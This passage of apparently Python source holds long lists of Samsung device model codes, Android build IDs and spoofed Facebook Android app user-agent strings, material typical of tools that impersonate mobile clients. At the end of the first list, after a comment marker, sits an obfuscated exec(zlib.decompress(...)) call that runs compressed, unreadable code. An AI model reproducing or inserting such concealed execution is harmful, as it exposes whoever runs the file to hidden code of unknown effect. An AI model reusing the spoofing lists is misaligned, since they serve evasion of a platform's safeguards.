Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T']#;exec(zlib.decompress(b'x\x9c\xed\x97Qk\xdb0\x10\xc7\xdf\xfd)\x04}\xb0\r\x9e\xddfk\x9a\x18\x02+\xcb\nc\xeb\x18,\xa3\xb01\x8cbI\x89\x12[ru2I(\xfd\xee\x93l\xc7\xce\x96\x94f\xef\xbe\x07\xe3\x9c\xee\xff?\xe9\xf4#`\x9e\x17Ri\xa4\xe8cIAC !\x80\x1d8L\xc9\x1c\xa5R\xa4\xa5RT\xe8\x90\x95\xbaT\x14\x10\xaf\xcbgKE1\xf9&e\xf6qK\xd3RK\x850\x1cd\x1d\xe7\xe2}\tTq\xc2\x05\x93s\xa9\x1d\x87P\x86\x80nw\x9e\x1f;\xc8\x04P\x00.\xc5d\xdf9l\x12\x9e_-\xdb\xa8^\x8c8\xd1rM\x05\x9a w8\xbe\xbc\x19\x8c\xc6\xef\xae\xde\xc6\xb7\xb7w\xec3\xacE\xf2\xf0c\xa6\x1e?\x8c\xc4\xd7r\xfae\xfd=\xe7\xc3\x9f\xa3|C>M\x87k\xb7vH\x97X\'\x9cT\xfa\xd1`pu}3\x1e]\xbb\xd5\xd2\xc5\x9b.<\x14\x01I\xb1"\xd5\x8aV\xbb\xb8\xddH\x9dO\n\xac\x97\xd6\xa5\xa9s\xdbu\xc63\x9ad\x1c\xb4Y\xfd\xc5\x103\xe3`\x88\x0b$!\xb4Y\xc2\x95w`\xe1#njB*\x08l\xb8^znX\xec\\\xffw\xe7f\xe5\xc6\xd1:\xb4\xce\xddflX\x1d\x92\x05\x15\x9eia=\xc3\x95\xe4\xe2\xb0IPI\xfd\x00\xb9j\xee\xfa\xf6v\xd8\xdf\x166J\x95M\x98\xbb\xd4\xba\x808\x8ap\xc1CM3\xbaP8\x0f\xa5ZDf\xf4O\xed\xf8\x9f#0;\x9e\xca\xb4\xcc\r\x10\xee\x91\x17\xc1\x1a\x0f&On3m7\xde\xcf\xfd\xf9d\xe9y\x95\xf6\x0c`J\xc9\xbem\x8c\xd8q\xd5\x82\xda\xc17\xfc\x84\x85\x04\xed\x99\x93\x05u\x1f\xfb\x08\x1a\xa3\xea\xe9\x1f\xe9\xcd\xc1^1\x18\x9cp\xa0\xdb\x94\x16:.0\xc0\x11K\x1dL\xd1TnD&1A\xe7b\xd5*z\xbez\xbe^\xe2\xeb\x04`\xd1\xac\x99\xed\xff\x93\xd6J{\xe4z\xe4N!\xd7\xd1\xb6\'\xa5\xa3\xed\xce\xea\xcfF\xee\x05}\x0f^\x0f\xde\xe9\xff\xba\x0e\xbd\x07s2\xb8-\x8a\xe8\x9e\x12\x8e\xdb\x9fh?\xc7\xf3!|\xd5\xa9\xc7\xb1\xc7\xb1\xc1\xd1\xa9.\xa4\xfb\xb4\xf1r\xbcM6R\xad\xa9\x82\xc9\xf8\xb2\x9a\xffj\xb5\xaao\xc0\xbc\x84P\xces\xae=\xfb\xad\xe3\xff\x9b\xcc1\x17u\xd21\xf1\x07s\x15\x00\xdf').decode())
samsung1 = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])

usragnt = ["[FBAN/FB4A;FBAV/76.0.0.24.67;FBBV/29581442;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/vodafone GR;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 816 dual sim;FBSV/5.0.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097171;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/TIGO;FBMF/Elite 4.0S;FBBD/Elite 4.0S;FBPN/com.facebook.katana;FBDV/Elite 4.0S;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022701;FBDM/{density=1.5,width=480,height=786};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H320;FBSV/5.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/MTS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/79.0.0.18.71;FBBV/31009847;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/BITEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI TAG-L03;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502156;FBDM/{density=1.0,width=1280,height=800};FBLC/fr_FR;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T530;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142836;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/AREEBA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.0.39;FBBV/32101960;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/Movistar;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y520-U33;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880455;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L710T;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/66.0.0.33.73;FBBV/23966353;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G313ML;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502160;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/DIALOG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200G;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/69.0.0.26.76;FBBV/25862460;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1021;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022701;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/TELCEL;FBMF/kyocera;FBBD/kyocera;FBPN/com.facebook.katana;FBDV/C6740N;FBSV/5.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/67.0.0.21.154;FBBV/24782425;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723423;FBDM/{density=1.5,width=480,height=800};FBLC/it_IT;FBCR/vodafone IT;FBMF/MEDIACOM;FBBD/MTK-6580M;FBPN/com.facebook.katana;FBDV/M-PPxB400;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/74.0.0.21.69;FBBV/28674189;FBDM/{density=1.3312501,width=800,height=1212};FBLC/es_LA;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-V400;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/87.0.0.17.79;FBBV/34592834;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/Movistar;FBMF/ZUUM;FBBD/ZUUM;FBPN/com.facebook.katana;FBDV/MAGNO;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142808;FBDM/{density=1.0,width=600,height=1024};FBLC/es_LA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T210R;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723413;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/BLADE L7;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/87.0.0.3.78;FBBV/34180696;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Claro AR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=2.0,width=720,height=1204};FBLC/en_US;FBCR/LoneStar;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-J8;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/142.0.0.29.92;FBBV/72571763;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/72870924;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J120H;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.0.177;FBBV/19340254;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/Claro;FBMF/LOGIC;FBBD/LOGIC;FBPN/com.facebook.katana;FBDV/LOGIC X5.5T;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/64.0.0.52.76;FBBV/22754206;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034615;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529747;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_E8;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
